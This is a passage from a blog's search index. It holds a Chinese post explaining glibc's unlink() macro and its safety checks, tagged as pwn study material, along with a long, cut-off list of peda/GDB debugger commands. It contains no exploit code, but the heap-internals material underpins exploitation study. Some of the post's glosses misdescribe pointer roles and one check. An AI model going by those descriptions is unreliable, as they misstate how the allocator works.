<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>3月月赛</title>
      <link href="/2019/03/11/3%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
      <url>/2019/03/11/3%E6%9C%88%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Unlink宏的实现机制</title>
      <link href="/2019/03/06/unlink%E5%AE%8F%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6/"/>
      <url>/2019/03/06/unlink%E5%AE%8F%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>unlink() 是一个宏，用于将某一个空闲 chunk 从其所处的 bin 中脱链。</p><p>在 malloc_consolidate() 函数中将 fastbin 中的空闲 chunk 整理到 unsorted_bin，在 malloc() 函数中用于将 unsorted_bin 中的空闲 chunk 整理到 smallbin 或者 largebin，以及在 malloc() 中获得堆空间时，均有可能调用 unlink() 宏。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                               </span></span><br><span class="line">    FD = P-&gt;fd;                      </span><br><span class="line">    BK = P-&gt;bk;                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br><span class="line">    <span class="keyword">else</span> &#123;                       </span><br><span class="line">        FD-&gt;bk = BK;                     </span><br><span class="line">        BK-&gt;fd = FD;                     </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)         </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;        </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)    </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action,         </span><br><span class="line">                   <span class="string">"corrupted double-linked list (not small)"</span>,</span><br><span class="line">                   P, AV);           </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;       </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)         </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                <span class="keyword">else</span> &#123;                   </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;    </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;    </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;    </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;    </span><br><span class="line">                  &#125;                  </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                   </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数P为待脱链的chunk, BK是前向指针, FD是后向指针</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;                      </span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></figure><p>FD保存P chunk的前一个空闲chunk, BK保存后一个空闲chunk</p><p>然后是一个检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>即 判断前一个空闲chunk的后向指针和后一个空闲chunk的前向指针是否指向P</p><p>因为fastbins是单链表结构, 所以unlink只能是从smallbins和largebins来脱离</p><p>判断成立的话, 会把这个chunk解下来</p><p>贴一张ctf wiki的图</p><p><img src="/2019/03/06/unlink宏的实现机制/unlink.jpg" alt="unlink"></p><p>接着判断:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>即 判断P chunk的size是否在small bin的范围内, 并且判断前一个chunk的size是否为空</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT <span class="comment">//16 in i386</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br></pre></td></tr></table></figure><p>large bin 结构图:</p><p><img src="/2019/03/06/unlink宏的实现机制/largebin.png" alt="large bin"></p><p>small bin 结构图:</p><p><img src="/2019/03/06/unlink宏的实现机制/small&#32;bin.png" alt="small bin"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Peda的几个命令</title>
      <link href="/2019/03/04/peda%E7%9A%84%E5%87%A0%E4%B8%AA%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/04/peda%E7%9A%84%E5%87%A0%E4%B8%AA%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="常用的几个堆的命令"><a href="#常用的几个堆的命令" class="headerlink" title="常用的几个堆的命令:"></a>常用的几个堆的命令:</h1><pre><code>fastbins -- Walk and print the fast binsfreebins -- Walk and print the nonempty free binsprint_bin_layout -- Dump the layout of a free binprint_bin_layout -- Dump the layout of a free binheap -- Libheap command help listingheapls -- Print a flat listing of an arenaheaplsc -- Print compact arena layout (all chunks)mstats -- Print general malloc stats</code></pre><p>附全部命令, 便于查阅:</p><h1 id="Command-class-aliases"><a href="#Command-class-aliases" class="headerlink" title="Command class: aliases"></a>Command class: aliases</h1><pre><code>ni -- Step one instructionrc -- Continue program being debugged but run it in reverserni -- Step backward one instructionrsi -- Step backward exactly one instructionsi -- Step one instruction exactlystepping -- Specify single-stepping behavior at a tracepointtp -- Set a tracepoint at specified locationtty -- Set terminal for future runs of program being debuggedwhere -- Print backtrace of all stack framesws -- Specify single-stepping behavior at a tracepoint</code></pre><h1 id="Command-class-breakpoints"><a href="#Command-class-breakpoints" class="headerlink" title="Command class: breakpoints"></a>Command class: breakpoints</h1><pre><code>awatch -- Set a watchpoint for an expressionbreak -- Set breakpoint at specified locationbreak-range -- Set a breakpoint for an address rangecatch -- Set catchpoints to catch eventscatch assert -- Catch failed Ada assertionscatch catch -- Catch an exceptioncatch exception -- Catch Ada exceptionscatch exec -- Catch calls to execcatch fork -- Catch calls to forkcatch load -- Catch loads of shared librariescatch rethrow -- Catch an exceptioncatch signal -- Catch signals by their names and/or numberscatch syscall -- Catch system calls by their names and/or numberscatch throw -- Catch an exceptioncatch unload -- Catch unloads of shared librariescatch vfork -- Catch calls to vforkcommands -- Set commands to be executed when a breakpoint is hitcondition -- Specify breakpoint number N to break only if COND is truedelete -- Delete some breakpoints or auto-display expressionsdelete bookmark -- Delete a bookmark from the bookmark listdelete breakpoints -- Delete some breakpoints or auto-display expressionsdelete checkpoint -- Delete a checkpoint (experimental)delete display -- Cancel some expressions to be displayed when program stopsdelete mem -- Delete memory regiondelete tracepoints -- Delete specified tracepointsdelete tvariable -- Delete one or more trace state variablesdisable -- Disable some breakpointsdisable breakpoints -- Disable some breakpointsdisable display -- Disable some expressions to be displayed when program stopsdisable frame-filter -- GDB command to disable the specified frame-filterdisable mem -- Disable memory regiondisable pretty-printer -- GDB command to disable the specified pretty-printerdisable probes -- Disable probesdisable tracepoints -- Disable specified tracepointsdisable type-printer -- GDB command to disable the specified type-printerdisable unwinder -- GDB command to disable the specified unwinderdisable xmethod -- GDB command to disable a specified (group of) xmethod(s)dprintf -- Set a dynamic printf at specified locationenable -- Enable some breakpointsenable breakpoints -- Enable some breakpointsenable breakpoints count -- Enable breakpoints for COUNT hitsenable breakpoints delete -- Enable breakpoints and delete when hitenable breakpoints once -- Enable breakpoints for one hitenable count -- Enable breakpoints for COUNT hitsenable delete -- Enable breakpoints and delete when hitenable display -- Enable some expressions to be displayed when program stopsenable frame-filter -- GDB command to disable the specified frame-filterenable mem -- Enable memory regionenable once -- Enable breakpoints for one hitenable pretty-printer -- GDB command to enable the specified pretty-printerenable probes -- Enable probesenable tracepoints -- Enable specified tracepointsenable type-printer -- GDB command to enable the specified type printerenable unwinder -- GDB command to enable unwindersenable xmethod -- GDB command to enable a specified (group of) xmethod(s)hbreak -- Set a hardware assisted breakpointignore -- Set ignore-count of breakpoint number N to COUNTrbreak -- Set a breakpoint for all functions matching REGEXPrwatch -- Set a read watchpoint for an expressionsave -- Save breakpoint definitions as a scriptsave breakpoints -- Save current breakpoint definitions as a scriptsave gdb-index -- Save a gdb-index filesave tracepoints -- Save current tracepoint definitions as a scriptskip -- Ignore a function while steppingskip delete -- Delete skip entriesskip disable -- Disable skip entriesskip enable -- Enable skip entriesskip file -- Ignore a file while steppingskip function -- Ignore a function while steppingstrace -- Set a static tracepoint at location or markertbreak -- Set a temporary breakpointtcatch -- Set temporary catchpoints to catch eventstcatch assert -- Catch failed Ada assertionstcatch catch -- Catch an exceptiontcatch exception -- Catch Ada exceptionstcatch exec -- Catch calls to exectcatch fork -- Catch calls to forktcatch load -- Catch loads of shared librariestcatch rethrow -- Catch an exceptiontcatch signal -- Catch signals by their names and/or numberstcatch syscall -- Catch system calls by their names and/or numberstcatch throw -- Catch an exceptiontcatch unload -- Catch unloads of shared librariestcatch vfork -- Catch calls to vforkthbreak -- Set a temporary hardware assisted breakpointtrace -- Set a tracepoint at specified locationwatch -- Set a watchpoint for an expression</code></pre><h1 id="Command-class-data"><a href="#Command-class-data" class="headerlink" title="Command class: data"></a>Command class: data</h1><pre><code>agent-printf -- Agent-printf &quot;printf format string&quot;append -- Append target code/data to a local fileappend binary -- Append target code/data to a raw binary fileappend binary memory -- Append contents of memory to a raw binary fileappend binary value -- Append the value of an expression to a raw binary fileappend memory -- Append contents of memory to a raw binary fileappend value -- Append the value of an expression to a raw binary filecall -- Call a function in the programdisassemble -- Disassemble a specified section of memorydisplay -- Print value of expression EXP each time the program stopsdump -- Dump target code/data to a local filedump binary -- Write target code/data to a raw binary filedump binary memory -- Write contents of memory to a raw binary filedump binary value -- Write the value of an expression to a raw binary filedump ihex -- Write target code/data to an intel hex filedump ihex memory -- Write contents of memory to an ihex filedump ihex value -- Write the value of an expression to an ihex filedump memory -- Write contents of memory to a raw binary filedump srec -- Write target code/data to an srec filedump srec memory -- Write contents of memory to an srec filedump srec value -- Write the value of an expression to an srec filedump tekhex -- Write target code/data to a tekhex filedump tekhex memory -- Write contents of memory to a tekhex filedump tekhex value -- Write the value of an expression to a tekhex filedump value -- Write the value of an expression to a raw binary filedump verilog -- Write target code/data to a verilog hex filedump verilog memory -- Write contents of memory to a verilog hex filedump verilog value -- Write the value of an expression to a verilog hex fileexplore -- Explore a value or a type valid in the current contextexplore type -- Explore a type or the type of an expression valid in the currentexplore value -- Explore value of an expression valid in the current contextinit-if-undefined -- Initialize a convenience variable if necessarymem -- Define attributes for memory region or reset memory region handling tooutput -- Like &quot;print&quot; but don&apos;t put in value history and don&apos;t print newlinepeda -- 1;31mPEDA1;34m - Python Exploit Development Assistance for GDBprint -- Print value of expression EXPprint-object -- Ask an Objective-C object to print itselfprintf -- Printf &quot;printf format string&quot;ptype -- Print definition of type TYPErestore -- Restore the contents of FILE to target memoryset -- Evaluate expression EXP and assign result to variable VARset ada -- Prefix command for changing Ada-specfic settingsset ada print-signatures -- Enable or disable the output of formal and return types for functions in the overloads selection menuset ada trust-PAD-over-XVS -- Enable or disable an optimization trusting PAD types over XVS typesset agent -- Set debugger&apos;s willingness to use agent as a helperset annotate -- Set annotation_levelset architecture -- Set architecture of targetset args -- Set argument list to give program being debugged when it is startedset auto-connect-native-target -- Set whether GDB may automatically connect to the native targetset auto-load -- Auto-loading specific settingsset auto-load gdb-scripts -- Enable or disable auto-loading of canned sequences of commands scriptsset auto-load libthread-db -- Enable or disable auto-loading of inferior specific libthread_dbset auto-load local-gdbinit -- Enable or disable auto-loading of .gdbinit script in current directoryset auto-load python-scripts -- Set the debugger&apos;s behaviour regarding auto-loaded Python scriptsset auto-load safe-path -- Set the list of files and directories that are safe for auto-loadingset auto-load scripts-directory -- Set the list of directories from which to load auto-loaded scriptsset auto-load-scripts -- Set the debugger&apos;s behaviour regarding auto-loaded Python scriptsset auto-solib-add -- Set autoloading of shared library symbolsset backtrace -- Set backtrace specific variablesset backtrace limit -- Set an upper bound on the number of backtrace levelsset backtrace past-entry -- Set whether backtraces should continue past the entry point of a programset backtrace past-main -- Set whether backtraces should continue past &quot;main&quot;set basenames-may-differ -- Set whether a source file may have multiple base namesset breakpoint -- Breakpoint specific settingsset breakpoint always-inserted -- Set mode for inserting breakpointsset breakpoint auto-hw -- Set automatic usage of hardware breakpointsset breakpoint condition-evaluation -- Set mode of breakpoint condition evaluationset breakpoint pending -- Set debugger&apos;s behavior regarding pending breakpointsset can-use-hw-watchpoints -- Set debugger&apos;s willingness to use watchpoint hardwareset case-sensitive -- Set case sensitivity in name searchset charset -- Set the host and target character setsset check -- Set the status of the type/range checkerset check range -- Set range checkingset check type -- Set strict type checkingset circular-trace-buffer -- Set target&apos;s use of circular trace bufferset code-cache -- Set cache use for code segment accessset coerce-float-to-double -- Set coercion of floats to doubles when calling functionsset compile-args -- Set compile command GCC command-line argumentsset complaints -- Set max number of complaints about incorrect symbolsset confirm -- Set whether to confirm potentially dangerous operationsset cp-abi -- Set the ABI used for inspecting C++ objectsset data-directory -- Set GDB&apos;s data directoryset dcache -- Use this command to set number of lines in dcache and line-sizeset dcache line-size -- Set dcache line size in bytes (must be power of 2)set dcache size -- Set number of dcache linesset debug -- Generic command for setting gdb debugging flagsset debug arch -- Set architecture debuggingset debug auto-load -- Set auto-load verifications debuggingset debug bfd-cache -- Set bfd cache debuggingset debug check-physname -- Set cross-checking of &quot;physname&quot; code against demanglerset debug coff-pe-read -- Set coff PE read debuggingset debug compile -- Set compile command debuggingset debug displaced -- Set displaced stepping debuggingset debug dwarf-die -- Set debugging of the DWARF DIE readerset debug dwarf-line -- Set debugging of the dwarf line readerset debug dwarf-read -- Set debugging of the DWARF readerset debug entry-values -- Set entry values and tail call frames debuggingset debug expression -- Set expression debuggingset debug frame -- Set frame debuggingset debug infrun -- Set inferior debuggingset debug jit -- Set JIT debuggingset debug libthread-db -- Set libthread-db debuggingset debug lin-lwp -- Set debugging of GNU/Linux lwp moduleset debug linux-namespaces -- Set debugging of GNU/Linux namespaces moduleset debug notification -- Set debugging of async remote notificationset debug observer -- Set observer debuggingset debug overload -- Set debugging of C++ overloadingset debug parser -- Set parser debuggingset debug py-unwind -- Set Python unwinder debuggingset debug record -- Set debugging of record/replay featureset debug remote -- Set debugging of remote protocolset debug serial -- Set serial debuggingset debug stap-expression -- Set SystemTap expression debuggingset debug symbol-lookup -- Set debugging of symbol lookupset debug symfile -- Set debugging of the symfile functionsset debug symtab-create -- Set debugging of symbol table creationset debug target -- Set target debuggingset debug timestamp -- Set timestamping of debugging messagesset debug varobj -- Set varobj debuggingset debug xml -- Set XML parser debuggingset debug-file-directory -- Set the directories where separate debug symbols are searched forset default-collect -- Set the list of expressions to collect by defaultset demangle-style -- Set the current C++ demangling styleset detach-on-fork -- Set whether gdb will detach the child of a forkset directories -- Set the search path for finding source filesset disable-randomization -- Set disabling of debuggee&apos;s virtual address space randomizationset disassemble-next-line -- Set whether to disassemble next source line or insn when execution stopsset disassembly-flavor -- Set the disassembly flavorset disconnected-dprintf -- Set whether dprintf continues after GDB disconnectsset disconnected-tracing -- Set whether tracing continues after GDB disconnectsset displaced-stepping -- Set debugger&apos;s willingness to use displaced steppingset dprintf-channel -- Set the channel to use for dynamic printfset dprintf-function -- Set the function to use for dynamic printfset dprintf-style -- Set the style of usage for dynamic printfset editing -- Set editing of command lines as they are typedset endian -- Set endianness of targetset environment -- Set environment variable value to give the programset exec-direction -- Set direction of executionset exec-done-display -- Set notification of completion for asynchronous execution commandsset exec-wrapper -- Set a wrapper for running programsset extended-prompt -- Set the extended promptset extension-language -- Set mapping between filename extension and source languageset filename-display -- Set how to display filenamesset follow-exec-mode -- Set debugger response to a program call of execset follow-fork-mode -- Set debugger response to a program call of fork or vforkset frame-filter -- Prefix command for &apos;set&apos; frame-filter related operationsset frame-filter priority -- GDB command to set the priority of the specified frame-filterset gnutarget -- Set the current BFD targetset guile -- Prefix command for Guile preference settingsset guile print-stack -- Set mode for Guile exception printing on errorset height -- Set number of lines in a page for GDB output paginationset history -- Generic command for setting command history parametersset history expansion -- Set history expansion on command inputset history filename -- Set the filename in which to record the command historyset history remove-duplicates -- Set how far back in history to look for and remove duplicate entriesset history save -- Set saving of the history record on exitset history size -- Set the size of the command historyset host-charset -- Set the host character setset inferior-tty -- Set terminal for future runs of program being debuggedset input-radix -- Set default input radix for entering numbersset interactive-mode -- Set whether GDB&apos;s standard input is a terminalset language -- Set the current source languageset libthread-db-search-path -- Set search path for libthread_dbset listsize -- Set number of source lines gdb will list by defaultset logging -- Set logging optionsset logging file -- Set the current logfileset logging off -- Disable loggingset logging on -- Enable loggingset logging overwrite -- Set whether logging overwrites or appends to the log fileset logging redirect -- Set the logging output modeset max-completions -- Set maximum number of completion candidatesset max-user-call-depth -- Set the max call depth for non-python/scheme user-defined commandsset max-value-size -- Set maximum sized value gdb will load from the inferiorset may-insert-breakpoints -- Set permission to insert breakpoints in the targetset may-insert-fast-tracepoints -- Set permission to insert fast tracepoints in the targetset may-insert-tracepoints -- Set permission to insert tracepoints in the targetset may-interrupt -- Set permission to interrupt or signal the targetset may-write-memory -- Set permission to write into target memoryset may-write-registers -- Set permission to write into registersset mem -- Memory regions settingsset mem inaccessible-by-default -- Set handling of unknown memory regionsset mi-async -- Set whether MI asynchronous mode is enabledset mpx -- Set Intel Memory Protection Extensions specific variablesset mpx bound -- Set the memory bounds for a given array/pointer storage in the bound tableset multiple-symbols -- Set the debugger behavior when more than one symbol are possible matchesset non-stop -- Set whether gdb controls the inferior in non-stop modeset observer -- Set whether gdb controls the inferior in observer modeset opaque-type-resolution -- Set resolution of opaque struct/class/union types (if set before loading symbols)set osabi -- Set OS ABI of targetset output-radix -- Set default output radix for printing of valuesset overload-resolution -- Set overload resolution in evaluating C++ functionsset pagination -- Set state of GDB output paginationset print -- Generic command for setting how things printset print address -- Set printing of addressesset print array -- Set pretty formatting of arraysset print array-indexes -- Set printing of array indexesset print asm-demangle -- Set demangling of C++/ObjC names in disassembly listingsset print demangle -- Set demangling of encoded C++/ObjC names when displaying symbolsset print elements -- Set limit on string chars or array elements to printset print entry-values -- Set printing of function arguments at function entryset print frame-arguments -- Set printing of non-scalar frame argumentsset print inferior-events -- Set printing of inferior events (e.g.set print max-symbolic-offset -- Set the largest offset that will be printed in &lt;symbol+1234&gt; formset print null-stop -- Set printing of char arrays to stop at first null charset print object -- Set printing of object&apos;s derived type based on vtable infoset print pascal_static-members -- Set printing of pascal static membersset print pretty -- Set pretty formatting of structuresset print raw -- Generic command for setting what things to print in &quot;raw&quot; modeset print raw frame-arguments -- Set whether to print frame arguments in raw formset print repeats -- Set threshold for repeated print elementsset print sevenbit-strings -- Set printing of 8-bit characters in strings as \nnnset print static-members -- Set printing of C++ static membersset print symbol -- Set printing of symbol names when printing pointersset print symbol-filename -- Set printing of source filename and line number with &lt;symbol&gt;set print symbol-loading -- Set printing of symbol loading messagesset print thread-events -- Set printing of thread events (such as thread start and exit)set print type -- Generic command for setting how types printshow print type methods -- Set printing of methods defined in classesshow print type typedefs -- Set printing of typedefs defined in classesset print union -- Set printing of unions interior to structuresset print vtbl -- Set printing of C++ virtual function tablesset prompt -- Set gdb&apos;s promptset python -- Prefix command for python preference settingsset python print-stack -- Set mode for Python stack dump on errorset radix -- Set default input and output number radicesset range-stepping -- Enable or disable range steppingset record -- Set record optionsset record btrace -- Set record optionsset record btrace bts -- Set record btrace bts optionsset record btrace bts buffer-size -- Set the record/replay bts buffer sizeset record btrace pt -- Set record btrace pt optionsset record btrace pt buffer-size -- Set the record/replay pt buffer sizeset record btrace replay-memory-access -- Set what memory accesses are allowed during replayset record full -- Set record optionsset record full insn-number-max -- Set record/replay buffer limitset record full memory-query -- Set whether query if PREC cannot record memory change of next instructionset record full stop-at-limit -- Set whether record/replay stops when record/replay buffer becomes fullset record function-call-history-size -- Set number of function to print in &quot;record function-call-history&quot;set record instruction-history-size -- Set number of instructions to print in &quot;record instruction-history&quot;set remote -- Remote protocol specific variablesset remote P-packet -- Set use of remote protocol `P&apos; (set-register) packetset remote TracepointSource-packet -- Set use of remote protocol `TracepointSource&apos; (TracepointSource) packetset remote X-packet -- Set use of remote protocol `X&apos; (binary-download) packetset remote Z-packet -- Set use of remote protocol `Z&apos; packetsset remote access-watchpoint-packet -- Set use of remote protocol `Z4&apos; (access-watchpoint) packetset remote agent-packet -- Set use of remote protocol `QAgent&apos; (agent) packetset remote allow-packet -- Set use of remote protocol `QAllow&apos; (allow) packetset remote attach-packet -- Set use of remote protocol `vAttach&apos; (attach) packetset remote binary-download-packet -- Set use of remote protocol `X&apos; (binary-download) packetset remote breakpoint-commands-packet -- Set use of remote protocol `BreakpointCommands&apos; (breakpoint-commands) packetset remote btrace-conf-bts-size-packet -- Set use of remote protocol `Qbtrace-conf:bts:size&apos; (btrace-conf-bts-size) packetset remote btrace-conf-pt-size-packet -- Set use of remote protocol `Qbtrace-conf:pt:size&apos; (btrace-conf-pt-size) packetset remote catch-syscalls-packet -- Set use of remote protocol `QCatchSyscalls&apos; (catch-syscalls) packetset remote conditional-breakpoints-packet -- Set use of remote protocol `ConditionalBreakpoints&apos; (conditional-breakpoints) packetset remote conditional-tracepoints-packet -- Set use of remote protocol `ConditionalTracepoints&apos; (conditional-tracepoints) packetset remote ctrl-c-packet -- Set use of remote protocol `vCtrlC&apos; (ctrl-c) packetset remote disable-btrace-packet -- Set use of remote protocol `Qbtrace:off&apos; (disable-btrace) packetset remote disable-randomization-packet -- Set use of remote protocol `QDisableRandomization&apos; (disable-randomization) packetset remote enable-btrace-bts-packet -- Set use of remote protocol `Qbtrace:bts&apos; (enable-btrace-bts) packetset remote enable-btrace-pt-packet -- Set use of remote protocol `Qbtrace:pt&apos; (enable-btrace-pt) packetset remote exec-event-feature-packet -- Set use of remote protocol `exec-event-feature&apos; (exec-event-feature) packetset remote exec-file -- Set the remote pathname for &quot;run&quot;set remote fast-tracepoints-packet -- Set use of remote protocol `FastTracepoints&apos; (fast-tracepoints) packetset remote fetch-register-packet -- Set use of remote protocol `p&apos; (fetch-register) packetset remote fork-event-feature-packet -- Set use of remote protocol `fork-event-feature&apos; (fork-event-feature) packetset remote get-thread-information-block-address-packet -- Set use of remote protocol `qGetTIBAddr&apos; (get-thread-information-block-address) packetset remote get-thread-local-storage-address-packet -- Set use of remote protocol `qGetTLSAddr&apos; (get-thread-local-storage-address) packetset remote hardware-breakpoint-limit -- Set the maximum number of target hardware breakpointsset remote hardware-breakpoint-packet -- Set use of remote protocol `Z1&apos; (hardware-breakpoint) packetset remote hardware-watchpoint-length-limit -- Set the maximum length (in bytes) of a target hardware watchpointset remote hardware-watchpoint-limit -- Set the maximum number of target hardware watchpointsset remote hostio-close-packet -- Set use of remote protocol `vFile:close&apos; (hostio-close) packetset remote hostio-fstat-packet -- Set use of remote protocol `vFile:fstat&apos; (hostio-fstat) packetset remote hostio-open-packet -- Set use of remote protocol `vFile:open&apos; (hostio-open) packetset remote hostio-pread-packet -- Set use of remote protocol `vFile:pread&apos; (hostio-pread) packetset remote hostio-pwrite-packet -- Set use of remote protocol `vFile:pwrite&apos; (hostio-pwrite) packetset remote hostio-readlink-packet -- Set use of remote protocol `vFile:readlink&apos; (hostio-readlink) packetset remote hostio-setfs-packet -- Set use of remote protocol `vFile:setfs&apos; (hostio-setfs) packetset remote hostio-unlink-packet -- Set use of remote protocol `vFile:unlink&apos; (hostio-unlink) packetset remote hwbreak-feature-packet -- Set use of remote protocol `hwbreak-feature&apos; (hwbreak-feature) packetset remote install-in-trace-packet -- Set use of remote protocol `InstallInTrace&apos; (install-in-trace) packetset remote interrupt-on-connect -- Set whether interrupt-sequence is sent to remote target when gdb connects toset remote interrupt-sequence -- Set interrupt sequence to remote targetset remote kill-packet -- Set use of remote protocol `vKill&apos; (kill) packetset remote library-info-packet -- Set use of remote protocol `qXfer:libraries:read&apos; (library-info) packetset remote library-info-svr4-packet -- Set use of remote protocol `qXfer:libraries-svr4:read&apos; (library-info-svr4) packetset remote memory-map-packet -- Set use of remote protocol `qXfer:memory-map:read&apos; (memory-map) packetset remote memory-read-packet-size -- Set the maximum number of bytes per memory-read packetset remote memory-write-packet-size -- Set the maximum number of bytes per memory-write packetset remote multiprocess-feature-packet -- Set use of remote protocol `multiprocess-feature&apos; (multiprocess-feature) packetset remote no-resumed-stop-reply-packet -- Set use of remote protocol `N stop reply&apos; (no-resumed-stop-reply) packetset remote noack-packet -- Set use of remote protocol `QStartNoAckMode&apos; (noack) packetset remote osdata-packet -- Set use of remote protocol `qXfer:osdata:read&apos; (osdata) packetset remote p-packet -- Set use of remote protocol `p&apos; (fetch-register) packetset remote pass-signals-packet -- Set use of remote protocol `QPassSignals&apos; (pass-signals) packetset remote pid-to-exec-file-packet -- Set use of remote protocol `qXfer:exec-file:read&apos; (pid-to-exec-file) packetset remote program-signals-packet -- Set use of remote protocol `QProgramSignals&apos; (program-signals) packetset remote query-attached-packet -- Set use of remote protocol `qAttached&apos; (query-attached) packetset remote read-aux-vector-packet -- Set use of remote protocol `qXfer:auxv:read&apos; (read-aux-vector) packetset remote read-btrace-conf-packet -- Set use of remote protocol `qXfer:btrace-conf&apos; (read-btrace-conf) packetset remote read-btrace-packet -- Set use of remote protocol `qXfer:btrace&apos; (read-btrace) packetset remote read-fdpic-loadmap-packet -- Set use of remote protocol `qXfer:fdpic:read&apos; (read-fdpic-loadmap) packetset remote read-sdata-object-packet -- Set use of remote protocol `qXfer:statictrace:read&apos; (read-sdata-object) packetset remote read-siginfo-object-packet -- Set use of remote protocol `qXfer:siginfo:read&apos; (read-siginfo-object) packetset remote read-spu-object-packet -- Set use of remote protocol `qXfer:spu:read&apos; (read-spu-object) packetset remote read-watchpoint-packet -- Set use of remote protocol `Z3&apos; (read-watchpoint) packetset remote reverse-continue-packet -- Set use of remote protocol `bc&apos; (reverse-continue) packetset remote reverse-step-packet -- Set use of remote protocol `bs&apos; (reverse-step) packetset remote run-packet -- Set use of remote protocol `vRun&apos; (run) packetset remote search-memory-packet -- Set use of remote protocol `qSearch:memory&apos; (search-memory) packetset remote set-register-packet -- Set use of remote protocol `P&apos; (set-register) packetset remote software-breakpoint-packet -- Set use of remote protocol `Z0&apos; (software-breakpoint) packetset remote static-tracepoints-packet -- Set use of remote protocol `StaticTracepoints&apos; (static-tracepoints) packetset remote supported-packets-packet -- Set use of remote protocol `qSupported&apos; (supported-packets) packetset remote swbreak-feature-packet -- Set use of remote protocol `swbreak-feature&apos; (swbreak-feature) packetset remote symbol-lookup-packet -- Set use of remote protocol `qSymbol&apos; (symbol-lookup) packetset remote system-call-allowed -- Set if the host system(3) call is allowed for the targetset remote target-features-packet -- Set use of remote protocol `qXfer:features:read&apos; (target-features) packetset remote thread-events-packet -- Set use of remote protocol `QThreadEvents&apos; (thread-events) packetset remote threads-packet -- Set use of remote protocol `qXfer:threads:read&apos; (threads) packetset remote trace-buffer-size-packet -- Set use of remote protocol `QTBuffer:size&apos; (trace-buffer-size) packetset remote trace-status-packet -- Set use of remote protocol `qTStatus&apos; (trace-status) packetset remote traceframe-info-packet -- Set use of remote protocol `qXfer:traceframe-info:read&apos; (traceframe-info) packetset remote unwind-info-block-packet -- Set use of remote protocol `qXfer:uib:read&apos; (unwind-info-block) packetset remote verbose-resume-packet -- Set use of remote protocol `vCont&apos; (verbose-resume) packetset remote verbose-resume-supported-packet -- Set use of remote protocol `vContSupported&apos; (verbose-resume-supported) packetset remote vfork-event-feature-packet -- Set use of remote protocol `vfork-event-feature&apos; (vfork-event-feature) packetset remote write-siginfo-object-packet -- Set use of remote protocol `qXfer:siginfo:write&apos; (write-siginfo-object) packetset remote write-spu-object-packet -- Set use of remote protocol `qXfer:spu:write&apos; (write-spu-object) packetset remote write-watchpoint-packet -- Set use of remote protocol `Z2&apos; (write-watchpoint) packetset remoteaddresssize -- Set the maximum size of the address (in bits) in a memory packetset remotebreak -- 